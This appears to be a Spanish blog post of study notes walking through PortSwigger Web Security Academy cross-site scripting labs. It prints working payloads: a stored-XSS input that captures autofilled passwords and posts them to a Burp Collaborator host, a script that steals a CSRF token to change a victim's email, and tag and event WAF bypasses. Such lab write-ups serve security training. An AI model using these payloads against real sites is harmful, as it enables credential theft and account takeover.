+<p>En estos días, <strong>muchos usuarios tienen administradores de contraseñas que autocompletan sus contraseñas</strong>. Puede aprovechar esto creando una entrada de contraseña, leyendo la contraseña autocompletada y enviándola a su propio dominio. Esta técnica evita la mayoría de los problemas asociados con el robo de cookies e incluso puede obtener acceso a cualquier otra cuenta en la que la víctima haya reutilizado la misma contraseña.</p>
+
+<p>La principal desventaja de esta técnica es que solo funciona en usuarios que tienen un administrador de contraseñas que realiza el autocompletado de contraseñas. (Por supuesto, si un usuario no tiene una contraseña guardada, aún puede intentar obtener su contraseña a través de un ataque de phishing en el sitio, pero no es exactamente lo mismo).</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 12: Exploiting cross-site scripting to capture password</strong></p>
+
+<p>Este laboratorio contiene una Stored XSS vulnerability en la función de comentarios del blog.</p>
+
+<p>Un usuario víctima ve todos los comentarios después de que ser publicados. Para resolver el laboratorio, aproveche la vulnerabilidad para filtrar el nombre de usuario y la contraseña de la víctima y luego use estas credenciales para iniciar sesión en la cuenta de la víctima.</p>
+
+<p>De nuevo, encontramos en el parámetro “comment” de la sección de comentarios una inyección HTML simple. Así, empleamos el siguiente código en el server exploit:</p>
+
+<pre><code class="language-HTML">&lt;input name=username id=username&gt;
+&lt;input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{ method:'POST', mode: 'no-cors', body:username.value+':'+this.value });"&gt;
+</code></pre>
+
+<p>Para recibir la contraseña y el usuario en el BurpCollaborator client.</p>
+
+<p><br /></p>
+
+<h4 id="33-exploiting-cross-site-scripting-to-perfom-csrf">3.3. Exploiting cross-site scripting to perfom CSRF.</h4>
+
+<p><strong>Cualquier cosa que un usuario legítimo pueda hacer en un sitio web, probablemente también pueda hacerlo con XSS</strong>.</p>
+
+<p>Dependiendo del sitio al que se dirija, es posible que pueda hacer que una víctima envíe un mensaje, acepte una solicitud de amistad, envíe una puerta trasera a un repositorio de código fuente o transfiera algo de Bitcoin.</p>
+
+<p>Algunos sitios web permiten a los usuarios registrados cambiar su dirección de correo electrónico sin volver a ingresar su contraseña. Si ha encontrado una vulnerabilidad XSS, puede activar esta funcionalidad para cambiar la dirección de correo electrónico de la víctima a una que usted controle y luego activar un restablecimiento de contraseña para obtener acceso a la cuenta.</p>
+
+<p>Este tipo de explotación generalmente se conoce como falsificación de solicitud entre sitios (CSRF), lo cual es un poco confuso porque CSRF también puede ocurrir como una vulnerabilidad independiente. Cuando CSRF ocurre como una vulnerabilidad independiente, se puede parchear usando estrategias como tokens anti-CSRF. Sin embargo, estas estrategias no brindan ninguna protección si también está presente una vulnerabilidad XSS.</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 13: Exploit XSS to perfom CSRF</strong></p>
+
+<p>Este laboratorio contiene una stored XSS vulnerability en la sección de los comentarios. Para resolver el laboratorio debemos explotar un CSRF attack y cambiar el email de la víctima que viene a visitar los comentarios.</p>
+
+<p>Vamos a emplear el siguiente script:</p>
+
+<pre><code class="language-HTML">&lt;script&gt; var req = new XMLHttpRequest(); req.onload = handleResponse; req.open('get','/my-account',true); req.send(); function handleResponse() { var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1]; var changeReq = new XMLHttpRequest(); changeReq.open('post', '/my-account/change-email', true); changeReq.send('csrf='+token+'&amp;email=test@test.com') }; &lt;/script&gt;
+</code></pre>
+
+<p>En el parámetro de “comment” en los comentarios de cualquier post.</p>
+
+<p><br /></p>
+
+<h3 id="4-cómo-encontrar-y-testear-vulnerabilidades-xss">4. Cómo encontrar y testear vulnerabilidades XSS.</h3>
+
+<p>La gran mayoría de las vulnerabilidades XSS se pueden encontrar de forma rápida y confiable utilizando el escáner de vulnerabilidades web de Burp Suite.</p>
+
+<p>La prueba manual de los reflected y stored XSS normalmente implica enviar una entrada única simple (como una cadena alfanumérica corta) en cada punto de entrada en la aplicación, identificar cada ubicación donde la entrada enviada se devuelve en las respuestas HTTP y probar cada ubicación individualmente para determinar si la entrada diseñada adecuadamente se puede utilizar para ejecutar JavaScript arbitrario. De esta forma, puede determinar el contexto en el que se produce el XSS y seleccionar una carga útil adecuada para explotarlo.</p>
+
+<p>La prueba manual de XSS basado en DOM que surge de los parámetros de URL implica un proceso similar: colocar una entrada única simple en el parámetro, usar las herramientas de desarrollo del navegador para buscar esta entrada en el DOM y probar cada ubicación para determinar si es explotable. Sin embargo, otros tipos de DOM XSS son más difíciles de detectar. Para encontrar vulnerabilidades basadas en DOM en entradas no basadas en URL (como document.cookie) o sumideros no basados en HTML (como setTimeout), no hay sustituto para revisar el código JavaScript, que puede llevar mucho tiempo.</p>
+
+<p>El escáner de vulnerabilidades web de Burp Suite combina el análisis estático y dinámico de JavaScript para automatizar de manera confiable la detección de vulnerabilidades basadas en DOM.</p>
+
+<p><br /></p>
+
+<h4 id="41-cross-site-scripting-context">4.1. Cross-site scripting context.</h4>
+
+<p>Cuando buscamos reflected y stored XSS es importante identificar el contexto XSS:</p>
+
+<ul>
+  <li>La localización del input del usuario en la respuesta.</li>
+  <li>El procesamiento que sufre el input que introduce el usuario en el caso de que este de refleje en alguna parte de la respuesta HTTP.</li>
+</ul>
+
+<p><br /></p>
+
+<h4 id="42-xss-between-html-tags">4.2. XSS between HTML tags.</h4>
+
+<p><strong>Laboratorio 14: Reflected XSS into HTML context with most tags and attributes blocked</strong></p>
+
+<p>Este laboratorio contiene una vulnerabilidad XSS reflected en la funcionalidad de búsqueda per utiliza un WAF para proteger contra ataques XSS comúnes. Sin embargo, el WAF está configurado por lista negra que puede ser débil ya que puede ser que exista alguna combinación tag-evento potencialmente dañina que no esté bloqueda. Para comprobarlo podemos recurrir a un atauqe de fuerza bruta basado en lista primero con tags y si encontramos alguno, con eventos.</p>
+
+<p>Así, buscamos un término y capturamos la request. La envíamos al BurpIntruder y realizamos un ataque de fuerza bruta con los eventos HTML del XSS Cheat Shet de Portswigger, obteniendo:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220628202207.png" text-align="center" />
+</div>
+
+<p><br /></p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220628202230.png" text-align="center" />
+</div>
+
+<p>Seguidamente, modificamos el valor del parámetro “search” como:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220628202330.png" text-align="center" />
+</div>
+
+<p>Y cambiamos la lista del payload de los tags a los eventos:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220628202413.png" text-align="center" />
+</div>
+
+<p>Así, tenmos que el evento “onresize” está disponible, lo que provocará la ejecución de código javascript cuando se tenga que ajustar la resolución de la ventana del navegador.</p>
+
+<p>Por ello, cargamos el siguiente código iframe en el server exploit:</p>
+
+<pre><code class="language-HTML">&lt;iframe src="https://your-lab-id.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'&gt;
+</code></pre>
+
+<p>Esto reajustará automáticamente la resolución de la ventana nadamás cargar el iframe, provocando la ejecución automática del código malicioso. Le damos a “Deliver to victim” y habríamos completado el laboratorio.</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 15: Reflected XSS into HTML context with all tags blocked except custom ones</strong></p>
+
+<p>Repitiendo la operación anterior obtenemos el tag “id” con el evento “onfocus”. Quedando la solución como:</p>
+
+<pre><code class="language-HTML">&lt;script&gt; location = 'https://your-lab-id.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x'; &lt;/script&gt;
+</code></pre>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 16: Reflected XSS with some SVG markup allowed</strong></p>
+
+<p>Este laboratorio tiene una vulnerabilidad Reflejada XSS simple. El sitio está bloqueando etiquetas comunes pero pierde algunas etiquetas y eventos SVG.</p>
+
+<p>Para resolver el laboratorio, realice un ataque de secuencias de comandos entre sitios que llame a la función alert().</p>
+
+<p><br /></p>
+
+<p>De nuevo procediendo como en los laboratorios anteriores obtenemos que el término</p>
+
+<pre><code class="language-HTML">&lt;svg&gt;&lt;animatetransform onbegin=alert(1)&gt;
+</code></pre>
+
+<p>está permitido, por tanto, resolvemos el laboratorio mediante el link:</p>
+
+<pre><code class="language-HTML">&lt;ifrema src="https://your-lab-id.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E"&gt;
+</code></pre>
+
+<p><br /></p>
+
+<h4 id="43-xss-in-html-tag-attributes">4.3. XSS in HTML tag attributes.</h4>
+
+<p>Existen casos en los que se encodean los braquets angulares: “&gt;”, “&lt;” pero no se encondean el resto de elementos. Sin embargo, aunque aquí la aplicación ya no es vulnerable a una inyección de entidad HTML todavía puede inyectarse un evento dañino que permita la ejecución de código JavaScript.</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 17: Reflected XSS into attribute with angle brackets HTML-encoded</strong></p>
+
+<p>Este laboratorio contiene una vulnerabilidad Reflected XSS pero se encodean los braquest angulares ya que al intentar inyectar un elemento HTML no obtenemos resultado. Sin embargo podemos observar que nuestro término de búsqueda también se queda incrustado a modo de atributo en un elemento HTML,</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220629082533.png" text-align="center" />
+</div>
+
+<p>Así, completamos el laboratorio introduciendo: “onmouseover=”alert(1) que desencadenará una alerta cada vez que se mueva el ratón por la ventana del navegador.</p>
+
+<p><br /></p>
+
+<p>También puede ocurrir que en una sección de comentarios se nos permita poner una referncia a un sitio web mediante un atributo “href”, en tal caso, la página puede ser vulnerable al payload <em>javascript:&lt;javascriptcode&gt;</em>.</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 18: Stored XSS into anchor href attribute with double quotes HTML-encoded</strong></p>
+
+<p>Entramos al laboratorio que simula una aplicación web con posts en los que es posible incorporar un sitio web mediante un atributo href:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220629084518.png" text-align="center" />
+</div>
+
+<p>De esta forma colocamos el payload javascript:alert(1) y completamos el laboratorio.</p>
+
+<p><br /></p>
+
+<p>En algunos casos se puede hacer uso del “canonical tag” que es una forma por la que un usuario interactúa con el navegador y que al intearactúar con el DOM desencadena Javascript. Dependiendo del sistema operatibo el canonical tag puede desencadenarse medainte el siguiente conjunto de teclas:</p>
+
+<ul>
+  <li>ALT+SHIFT+X</li>
+  <li>CTRL+ALT+X</li>
+  <li>Alt+X</li>
+</ul>
+
+<p>El laboratorio se completa añadiendo el parámetro: /?%27accesskey=%27x%27onclick=%27alert(1) a la URL del sitio web y comprobando como pulsando alguna combinación de teclas de entre las anteriores se obtiene el código JavaScript.</p>
+
+<p><br /></p>
+
+<h4 id="44-xss-in-javascript">4.4. XSS in JavaScript.</h4>
+
+<p>Puede ser que el término reflejado se refleje en un plantilla JavaScript presente en la respuesta HTTP. De esta forma, podemos, si el input no se valida adecuadamente, cerrar el tag &lt;script&gt; e inyectar HTML:</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 18: Reflected XSS into a JavaScript string with single quote and backslash escaped</strong></p>
+
+<p>Accedemos al laboratorio y comprobamos que nuestro término se refleja en una plantilla JavaScript:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220629091357.png" text-align="center" />
+</div>
+
+<p>Haciendo una serie de prueba comprobamos que se puede inyectar HTML en dicha plantilla y terminamos el laboratorio inyecatndo un elemento script: &lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;.</p>
+
+<p><br /></p>
+
+<p>También podemos intentar inyecat código JavaScript en la plantilla.</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 19: Reflected XSS into a JavaScript string with angle brackets HTML encoded</strong></p>
+
+<p>Este laboratorio contiene una vulnerabilidad Reflected XSS en la search query en el que es imposible inyectar HTML. Sin embargo nuestro input se refleja en una plantilla JavaScript:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220629092129.png" text-align="center" />
+</div>
+
+<p>De esta forma, podemos intentar inyecat JavaScript mediante: ‘-alert(1)-‘</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 20: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped</strong></p>
+
+<p>Este laboratorio contiene de nuevo una vulnerabilidad XSS que se refleja en una plantilla JavaScript:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220629094655.png" text-align="center" />
+</div>
+
+<p>Así, introducmos el siguiente payload: ‘;-alert(1)// para inyectar JavaScript.</p>
+
+
+      </article>
+
+      
+        <div class="blog-tags">
+          <span>Tags:</span>
+          
+            <a href="/tags#burp">burp</a>
+          
+        </div>
+      
+
+      
+
+      
+        <!-- Check if any share-links are active -->
+
+
+
+
+<section id = "social-share-section">
+  <span class="sr-only">Share: </span>
+
+  
+    <a href="https://twitter.com/intent/tweet?text=11.+Cross-Site+Scripting.&url=http%3A%2F%2Flocalhost%3A4000%2F2022-03-16-11.Cross-site_scripting_%28XSS%29%2F"
+      class="btn btn-social-icon btn-twitter" title="Share on Twitter">
+      <span class="fab fa-fw fa-twitter" aria-hidden="true"></span>
+      <span class="sr-only">Twitter</span>
+    </a>
+  
+
+  
+    <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2F2022-03-16-11.Cross-site_scripting_%28XSS%29%2F"
+      class="btn btn-social-icon btn-facebook" title="Share on Facebook">
+      <span class="fab fa-fw fa-facebook" aria-hidden="true"></span>
+      <span class="sr-only">Facebook</span>
+    </a>
+  
+
+  
+    <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2F2022-03-16-11.Cross-site_scripting_%28XSS%29%2F"
+      class="btn btn-social-icon btn-linkedin" title="Share on LinkedIn">
+      <span class="fab fa-fw fa-linkedin" aria-hidden="true"></span>
+      <span class="sr-only">LinkedIn</span>
+    </a>
+  
+
+  
+
+  
+
+</section>
+
+
+
+      
+
+      <ul class="pagination blog-pager">
+        
+        <li class="page-item previous">
+          <a class="page-link" href="/2022-03-15-10.XXE_injection/" data-toggle="tooltip" data-placement="top" title="10. XXE Injection.">&larr; Previous Post</a>
+        </li>
+        
+        
+        <li class="page-item next">
+          <a class="page-link" href="/2022-03-17-12.Cross-site_request_forgery_(CSRF)/" data-toggle="tooltip" data-placement="top" title="12. Cross-Site Request Forgery.">Next Post &rarr;</a>
+        </li>
+        
+      </ul>
+      
+  
+  
+  
+
+  
+
+
+  
+
+
+
+    </div>
+  </div>
+</div>
+
+
+  <footer>
+  <div class="container-md beautiful-jekyll-footer">
+    <div class="row">
+      <div class="col-xl-8 offset-xl-2 col-lg-10 offset-lg-1">
+      <ul class="list-inline text-center footer-links"><li class="list-inline-item">
+    <a href="/feed.xml" title="RSS">
+      <span class="fa-stack fa-lg" aria-hidden="true">
+        <i class="fas fa-circle fa-stack-2x"></i>
+        <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+      </span>
+      <span class="sr-only">RSS</span>
+    </a>
+  </li><li class="list-inline-item">
+    <a href="mailto:sanmillan.german@gmail.com" title="Email me">
+      <span class="fa-stack fa-lg" aria-hidden="true">
+        <i class="fas fa-circle fa-stack-2x"></i>
+        <i class="fas fa-envelope fa-stack-1x fa-inverse"></i>
+      </span>
+      <span class="sr-only">Email me</span>
+   </a>
+  </li><li class="list-inline-item">
+    <a href="https://github.com/Qv1nTv5" title="GitHub">
+      <span class="fa-stack fa-lg" aria-hidden="true">
+        <i class="fas fa-circle fa-stack-2x"></i>
+        <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+      </span>
+      <span class="sr-only">GitHub</span>
+   </a>
+  </li><li class="list-inline-item">
+    <a href="https://twitter.com/Qvintvs1" title="Twitter">
+      <span class="fa-stack fa-lg" aria-hidden="true">
+        <i class="fas fa-circle fa-stack-2x"></i>
+        <i class="fab fa-twitter fa-stack-1x fa-inverse"></i>
+      </span>
+      <span class="sr-only">Twitter</span>
+   </a>
+  </li><li class="list-inline-item">
+    <a href="https://linkedin.com/in/german-sanmillan-68b308229/" title="LinkedIn">
+      <span class="fa-stack fa-lg" aria-hidden="true">
+        <i class="fas fa-circle fa-stack-2x"></i>
+        <i class="fab fa-linkedin fa-stack-1x fa-inverse"></i>
+      </span>
+      <span class="sr-only">LinkedIn</span>
+   </a>
+  </li></ul>
+
+      
+      <p class="copyright text-muted">
+      
+        Qv1nTv5
+        &nbsp;&bull;&nbsp;
+      
+      2024
+
+      
+
+      
+      </p>
+      <p class="theme-by text-muted">
+        Powered by
+        <a href="https://beautifuljekyll.com">Beautiful Jekyll</a>
+      </p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+  
+  
+    
+  <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha256-4+XzXVhsDmqanXGHaHvgh1gMQKX40OUvDEBTu8JcmNs=" crossorigin="anonymous"></script>
+
+
+  
+    
+  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
+
+
+  
+    
+  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
+
+
+  
+
+
+
+  
+    <!-- doing something a bit funky here because I want to be careful not to include JQuery twice! -->
+    
+      <script src="/assets/js/beautifuljekyll.js"></script>
+    
+  
+
+
+
+
+
+
+
+
+
+</body>
+</html>
